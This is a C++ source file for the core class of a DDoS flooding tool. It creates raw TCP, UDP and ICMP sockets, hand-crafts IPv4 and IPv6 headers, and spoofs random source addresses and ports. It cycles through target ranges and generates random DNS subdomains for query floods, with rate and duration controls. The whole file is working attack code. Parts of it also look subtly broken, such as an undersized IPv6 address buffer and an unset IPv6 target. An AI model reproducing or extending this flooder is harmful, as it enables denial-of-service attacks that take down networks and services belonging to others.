#include <arpa/inet.h>
#include<stdlib.h>

#include "xtool.h"
#include "netpool.h"
#include "rand.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include <sys/socket.h>
#include <sys/types.h>	




void CAttack::init(){
	m_job_status = JOB_PAUSE;
	
	m_curcnt_in_cycle = 0;
	m_curcnt_total = 0;
	m_eclapse_second = 0;

	uint32_t ii = 0;
    for (ii = 0; ii < MAX_THRD_CNT; ii++)
    {
    	m_fd[ii] = -1;
    	m_pkt_buf[ii] = NULL;
    }

	rand_init();

}

CAttack::CAttack() {
	// TODO Auto-generated constructor stub
    init();
}

CAttack::~CAttack() {
	// TODO Auto-generated destructor stub
	libnet_destroy(m_libnet);
}

void CAttack::set_ddos_params(CDDoSParam *params)
{
	m_params = *params;

    /*初始化值*/
    m_cur_dstaddr = m_params.m_dstnet.begin_addr;
    m_cur_srcaddr = m_params.m_srcnet.begin_addr;
	m_cur_dstaddr6 = m_params.m_dstnet6.begin_addr6;
    m_cur_srcaddr6 = m_params.m_srcnet6.begin_addr6;
    m_cur_dstport = m_params.m_dstport.begin_port;
    m_cur_srcport = m_params.m_srcport.begin_port;
	
    if (m_params.m_speed != NOLIMIT_SPEED)
    {
        m_maxcnt_in_cycle = m_params.m_speed * ATTACK_TIMER_INTVAL/1000;
        RC_LOG_INFO("max %d packet in a cycle", m_maxcnt_in_cycle);
    }
}

uint32_t CAttack::get_cur_dstaddr()
{
	uint32_t ret = m_cur_dstaddr;

	if (m_cur_dstaddr == m_params.m_dstnet.end_addr)
	{
		m_cur_dstaddr = m_params.m_dstnet.begin_addr;
	}
	else
	{
		m_cur_dstaddr++;
	}
	//printf("CAttack::get_cur_dstaddr() : %d\n", ret);
	return ret;
}

uint32_t CAttack::get_cur_srcaddr()
{
	uint32_t ret = m_cur_srcaddr;

	if (m_params.m_srcnet.begin_addr == 0)
	{
		return  rand_next();
	}

	if (m_cur_srcaddr == m_params.m_srcnet.end_addr)
	{
		m_cur_srcaddr = m_params.m_srcnet.begin_addr;
	}
	else
	{
		m_cur_srcaddr++;
	}
	return ret;
}


struct libnet_in6_addr CAttack::get_cur_dstaddr6()
{

	struct libnet_in6_addr ret = m_cur_dstaddr6;

    bool isEqual = true;
	for (int i=0; i<4; i++)
	{
		if (m_cur_dstaddr6.__u6_addr.__u6_addr32[i] != m_params.m_dstnet6.end_addr6.__u6_addr.__u6_addr32[i])
		{
			isEqual = false;
			break;
		}
	}
    
	if (isEqual)
	{
		m_cur_dstaddr6 = m_params.m_dstnet6.begin_addr6;
	}
	else
	{
        uint64_t flag=1;
	    for (int i=3; i>=0; i--){
			flag=(uint64_t) (ntohl(m_cur_dstaddr6.__u6_addr.__u6_addr32[i]) +flag);
			m_cur_dstaddr6.__u6_addr.__u6_addr32[i] = htonl( flag%0xffffffff);
		    flag= flag>0xffffffff?1:0;
	    }
	}
	return ret;
}

struct libnet_in6_addr CAttack::get_cur_srcaddr6()
{
    bool ip_Zero=true;
	for (int i=0; i<4; i++){
		if (m_params.m_srcnet6.begin_addr6.__u6_addr.__u6_addr32[i] != 0){
			ip_Zero=false;
		}
	}

	if (ip_Zero==true)
	{
	    struct libnet_in6_addr tmp;
		for (int i=0; i<4; i++){
			tmp.__u6_addr.__u6_addr32[i] =rand_next();
		}
		return  tmp;
	}

	struct libnet_in6_addr ret = m_cur_srcaddr6;

    bool isEqual=true;
	for (int i=0; i<4; i++){
		if (m_cur_dstaddr6.__u6_addr.__u6_addr32[i] != m_params.m_dstnet6.end_addr6.__u6_addr.__u6_addr32[i]){
			isEqual=false;
			break;
		}
	}
    
	if (isEqual)
	{
		m_cur_srcaddr6 = m_params.m_srcnet6.begin_addr6;
	}
	else
	{
        uint64_t flag=1;
		int i;
	    for ( i=3; i>=0; i--){
			flag=(uint64_t) (ntohl(m_cur_srcaddr6.__u6_addr.__u6_addr32[i]) +flag);
			m_cur_srcaddr6.__u6_addr.__u6_addr32[i] = htonl( flag%0xffffffff);
		    flag= flag>0xffffffff?1:0;
	    }
	}
	return ret;


}


uint16_t CAttack::get_cur_dstport()
{
	uint16_t ret = m_cur_dstport;

	if (m_cur_dstport == m_params.m_dstport.end_port)
	{
		m_cur_dstport = m_params.m_dstport.begin_port;
	}
	else
	{
		m_cur_dstport++;
	}
	return ret;
}

uint16_t CAttack::get_cur_srcport()
{
	uint16_t ret = m_cur_srcport;

	if (m_params.m_srcport.begin_port == 0)
	{
		/*give a src port*/
		return rand_next() & 0xffff;
	}

	if (m_cur_srcport == m_params.m_srcport.end_port)
	{
		m_cur_srcport = m_params.m_srcport.begin_port;
	}
	else
	{
		m_cur_srcport++;
	}

	return ret;
}

//产生16进制的mac地址
void CAttack::get_random_mac(char *client_ip_mac)
{
	if(strlen(m_params.m_client_ip_mac) == 0 ) 
	{
		sprintf(client_ip_mac, "%012x", m_curcnt_total + m_params.m_mac_start + 1);
		//printf("m_curcnt_total:%d\n", m_curcnt_total);
		// client_ip_mac[0] = '0';
		// client_ip_mac[1] = '0';
		// char metachar[] = "0123456789abcdef";
		// srand((unsigned) time(NULL));
	
		// for (int i = 2; i < 12; i++)
		// {
		// 	client_ip_mac[i] = metachar[(rand()+m_curcnt_total) % 16];
		// }	
		}
	else
	{
		strncpy(client_ip_mac, m_params.m_client_ip_mac, 12); //
	}
		
}

//产生一个64字节的随机域名
void CAttack::get_dns_domain(char *domain_name)
{
	if (m_params.m_is_random_domain)
	{
		char rand_ch[64] = {0};
        rand_str((char*)rand_ch, 63);
		snprintf(domain_name, MAX_DOMAIN_LEN, "%s%s", m_params.m_domain, rand_ch);
	}
	else
	{
		strncpy(domain_name, m_params.m_domain, MAX_DOMAIN_LEN);
	}
}

uint32_t CAttack::get_cur_seq()
{
	return 0x12345678;
}

uint32_t CAttack::get_cur_ack()
{
	return 0x87654321;
}

int CAttack::init_raw_tcp_socket()
{
	int fd = -1;
#define MAXBUFLEN                65536

    int i = 1;
	if(m_params.m_ip_type==IP_V4){
		if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	    {
	        RC_LOG_ERROR("Failed to create raw socket. Aborting attack");
	        return -1;
	    }
		i=1;
		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
		{
			RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
			close(fd);
			return -1;
		}

	}else{
		if ((fd = socket(PF_PACKET, SOCK_RAW, IPPROTO_TCP)) == -1)
		{
			RC_LOG_ERROR("Failed to create raw socket. Aborting attack");
			return -1;
		}
		i = 1;
		//设置在
		/*if (setsockopt(fd, IPPROTO_IPV6, IP_HDRINCL, &i, sizeof (int)) == -1)
		{
			RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
			close(fd);
			return -1;
		}*/

   }

   
    i = MAXBUFLEN - 1;
    if ( setsockopt( fd, SOL_SOCKET, SO_SNDBUF, (const char *)&i, sizeof( i ) ) < 0 ) 
    {
        RC_LOG_ERROR( "setsockopt SO_SNDBUF error" );
        close(fd);
        return -1;
    }

    RC_LOG_INFO("init tcp raw socket %d", fd);
    return fd;
}


int CAttack::init_raw_udp_socket()
{
	int fd = -1;
	int i=1;

   if(m_params.m_ip_type==IP_V4){  
		if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
	    {
	        RC_LOG_ERROR("Failed to create raw socket. Aborting attack");
	        return -1;
	    }
		i = 1;
		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
		{
			RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
			close(fd);
			return -1;
		}

 	}else{
		if ((fd = socket(PF_PACKET, SOCK_RAW, IPPROTO_UDP /*ETH_P_IPV6*/)) == -1)
		{
			RC_LOG_ERROR("Failed to create raw socket. Aborting attack");
			return -1;
		}
		i = 1;/*
		if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &i, sizeof (int)) == -1)
		{
			RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
			close(fd);
			return -1;
		}*/

   }
	

	#define MAXBUFLEN                65536
    i = MAXBUFLEN - 1;
    if ( setsockopt( fd, SOL_SOCKET, SO_BROADCAST | SO_SNDBUF, (const char *)&i, sizeof( i ) ) < 0 ) 
    {
        RC_LOG_ERROR( "setsockopt SO_SNDBUF error" );
        close(fd);
        return -1;
    }

    RC_LOG_INFO("init udp raw socket %d", fd);
    return fd;
}

int CAttack::init_raw_icmp_socket()
{
	int fd = -1;

	if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
	{
		RC_LOG_ERROR("Failed to create raw socket. Aborting attack");
		return -1;
	}

	int i = 1;
	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
	{
		RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
		close(fd);
		return -1;
	}

#define MAXBUFLEN                65536
	i = MAXBUFLEN - 1;
	if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST | SO_SNDBUF, (const char *)&i, sizeof(i)) < 0)
	{
		RC_LOG_ERROR("setsockopt SO_SNDBUF error");
		close(fd);
		return -1;
	}

	RC_LOG_INFO("init udp raw socket %d", fd);
	return fd;
}

#define REMOTEIP "::1"

int CAttack::sendpkt(uint32_t dstaddr , int dport,int pkt_len,int thrd_index ){


    if(m_params.m_ip_type == IP_V4){
		struct sockaddr_in target;
		memset(&target, 0, sizeof(struct sockaddr_in));
		target.sin_family = AF_INET;
		target.sin_port = htons(dport);
		target.sin_addr.s_addr = htonl(dstaddr);
		
		int ret = sendto(m_fd[thrd_index], m_pkt_buf[thrd_index], pkt_len,
			0, (struct sockaddr*)&target, sizeof(struct sockaddr_in));
		if (ret != pkt_len)
		{
			char err_buf[64] = { 0 };
			RC_LOG_ERROR("send failed, fd %d, %s.",
				m_fd[thrd_index], str_error_s(err_buf, sizeof(err_buf), errno));
		}
	}else{
		struct sockaddr_in6 target6;
		target6.sin6_family = AF_INET6;
		target6.sin6_port = htons(dport);
		//target6.sin6_flowinfo =  htons(dport);
		
		char ipv6[] = {0x64,0xff,0x9b,0,0,0,0,0,0,0,0,0,0,0,0,0};
		uint32_t* te=(uint32_t*)(ipv6+12);
		*(te) =  dstaddr;
        //util_memcpy(&target6.sin6_addr, ipv6, 16);

		/*
		uint32_t tmp[4] ={0,0,0,(0x64)<<16 |0xff9b};//4*32=128 tmp[3]是ipv6中最前面的
		tmp[0] = dstaddr;   
        tmp[0] = htonl(tmp[0]);//转换为字节序0x12345678 --> 78 56 34 12
		tmp[1] = htonl(tmp[1]);
		tmp[2] = htonl(tmp[2]);
		tmp[3] = htonl(tmp[3]);
		util_memcpy(&target6.sin6_addr, tmp, sizeof(tmp));//已经是字节序了 直接复制
        */
        if(1){//打印地址			
			char buff[16];
			inet_ntop(AF_INET6,&target6.sin6_addr,buff,16);
			RC_LOG_INFO("ipv6addr:: %s",buff);
			inet_ntop(AF_INET6,m_pkt_buf[thrd_index],buff,16);
			RC_LOG_INFO("ipv6addr:: %s",buff);		          
		}
	
		int ret = sendto(m_fd[thrd_index], m_pkt_buf[thrd_index], pkt_len,
			0, (struct sockaddr*)&target6, sizeof(struct sockaddr_in6));
		if (ret != pkt_len)
		{
			char err_buf[64] = { 0 };
			RC_LOG_ERROR("send failed, fd %d, %s,%d.",
				m_fd[thrd_index], str_error_s(err_buf, sizeof(err_buf), errno),(m_pkt_buf[thrd_index][0]>>4));
		}		

	}

	return RC_OK;
}

void CAttack::common_free()
{
	uint32_t ii = 0;
    for (ii = 0; ii < g_thrd_cnt; ii++)
    {
    	if (m_fd[ii] != -1)
    	{
	        close(m_fd[ii]);
	        m_fd[ii] = -1;
    	}

    	if (NULL != m_pkt_buf[ii])
    	{
	        free(m_pkt_buf[ii]);
	        m_pkt_buf[ii] = NULL;
    	}
    }   
}

JOB_ST_E CAttack::update_job_status() {
	if (m_params.m_duration != NOLIMIT_DURATION)
	{
		if (m_eclapse_second >= m_params.m_duration)
		{
			RC_LOG_INFO("attack time reach up");
			return JOB_STOP;
		}
	}

	if (m_params.m_total_cnt != NOLIMIT_COUNT)
	{
		if (m_curcnt_total >= m_params.m_total_cnt)
		{
			//printf("%d,  %d\n", m_curcnt_total, m_params.m_total_cnt);
			RC_LOG_INFO("attack count reach up");
			printf("sent packet count reach up:%d\n", m_curcnt_total);
			exit(1);
			//return JOB_STOP;
		}
	}

	if (m_params.m_speed != NOLIMIT_SPEED)
	{
		if (m_curcnt_in_cycle >= m_maxcnt_in_cycle)
		{
			return JOB_PAUSE;
		}
	}
	
	return JOB_GOON;
}

void CAttack::expire_handle()
{
	this->m_curcnt_in_cycle = 0;
	this->m_eclapse_second += ATTACK_TIMER_INTVAL;

    /*重新更新状态*/
    this->m_job_status = this->update_job_status();
}

void CAttack::attack_handle(int thrd_index)
{
    if (m_job_status == JOB_STOP)
    {
        return;
    }

	if (m_job_status == JOB_PAUSE)
    {
        return;
    }

    this->attack_one_pkt(thrd_index);

    this->m_curcnt_total++;
    this->m_curcnt_in_cycle++;
    this->m_job_status = this->update_job_status();
}


int CAttack::copy_ip_header(char * buffer,uint32_t buffer_len,pdu_l3_desc_t *pdu_desc){

    if(pdu_desc->ip_type == IP_V4){
		IP_HEADER_T *iphdr = NULL;
		if (buffer_len < ( sizeof(IP_HEADER_T) + pdu_desc->layer3_total_len) )
		{
			return (uint32_t)(-1);
		}
		
		iphdr = (IP_HEADER_T*)&buffer[0];
		iphdr->h_lenver=(4<<4 | sizeof(IP_HEADER_T)/4);
		iphdr->total_len = htons(sizeof(IP_HEADER_T) + pdu_desc->layer3_total_len);

		iphdr->ident	= htons(pdu_desc->identity);
		if (pdu_desc->dont_frag)
			iphdr->frag_and_flags = htons(1 << 14);
		
		iphdr->ttl	= pdu_desc->ttl;
		iphdr->proto	= pdu_desc->iph_proto;
		iphdr->checksum = 0;
		iphdr->sourceIP = htonl(pdu_desc->srcaddr);
		iphdr->destIP	= htonl(pdu_desc->dstaddr);
		return sizeof(IP_HEADER_T);
	}else{
		IP_V6_HEADER_T *ip6hdr = NULL;
		if (buffer_len < (sizeof(IP_V6_HEADER_T) + pdu_desc->layer3_total_len))
		{
			return (uint32_t)(-1);
		}
		ip6hdr = (IP_V6_HEADER_T*)&buffer[0];
		ip6hdr->version = 6; //ipv6协议
		ip6hdr->priority=6;
		//ipv6优先级
		//ip6hdr->flow_lbl[0]= (pdu_desc->sport&0x0f) ;//确定唯一的流标签 低4位
		ip6hdr->flow_lbl[0]= 0 ;
		ip6hdr->flow_lbl[1]= (pdu_desc->dport>>8); 
		ip6hdr->flow_lbl[2]= pdu_desc->dport & 0xff;
		ip6hdr->payload_len = /*htons(sizeof(IP_V6_HEADER_T) +*/ pdu_desc->layer3_total_len;
		ip6hdr->nexthdr = pdu_desc->iph_proto;
		ip6hdr->hop_limit = pdu_desc->ttl;//下一跳限制即为存活时间
		//64:ff9b::[ipv4]
		

		uint32_t tmp[4] ={0,0,0,(0x64)<<16 |0xff9b};//4*32=128 tmp[3]是ipv6中最前面的 64:ff9b::[ip]
		tmp[0] = pdu_desc->srcaddr;   
		

  		ip6hdr->sourceIP.addr[0] = htonl(tmp[0]);
		ip6hdr->sourceIP.addr[1] = htonl(tmp[1]);
		ip6hdr->sourceIP.addr[2] = htonl(tmp[2]); 
        ip6hdr->sourceIP.addr[3] = htonl(tmp[3]);

		tmp[0] = pdu_desc->dstaddr;  
		ip6hdr->destIP.addr[0]=htonl(tmp[0]);
		ip6hdr->destIP.addr[1]=htonl(tmp[1]);
		ip6hdr->destIP.addr[2]=htonl(tmp[2]);
		ip6hdr->destIP.addr[3]=htonl(tmp[3]);

		return sizeof(IP_V6_HEADER_T);
	}

}


